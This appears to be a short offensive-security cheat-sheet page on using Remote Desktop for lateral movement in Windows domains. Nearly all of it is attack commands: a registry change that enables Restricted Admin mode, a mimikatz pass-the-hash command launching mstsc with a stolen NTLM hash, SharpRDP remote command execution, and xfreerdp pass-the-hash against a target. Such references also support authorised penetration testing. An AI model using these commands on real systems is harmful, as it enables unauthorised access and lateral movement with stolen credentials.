# Remote desktop

## Windows RDP

### Remote Desktop

{% hint style="info" %}
/admin allows to not disconnect connected user
{% endhint %}

```csharp
 mstsc.exe /admin
```

#### Restricted Admin

Allow to use the current user credentials session to make a network connection without entering a password.

#### Enable Restricted admin

```csharp
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

```csharp
 mstsc.exe /restrictedadmin 
```

#### Using mimikatz

```csharp
sekurlsa::pth /user:admin /domain:domain /ntlm:<NTLM HASH> /run:"mstsc.exe /restrictedadmin"
```

## SharpRDP

#### RDP in console

```csharp
SharpRDP.exe computername=target command=notepad username=domain\user password=password!


```



## Linux RDP

### xfreerdp

```csharp
xfreerdp /d:domain  /u:user  /pth:NTLM_HASH  /v:DEST_IP
```

### rdesktop

```csharp
rdesktop DEST_IP   -u Domain\User -p Password
```

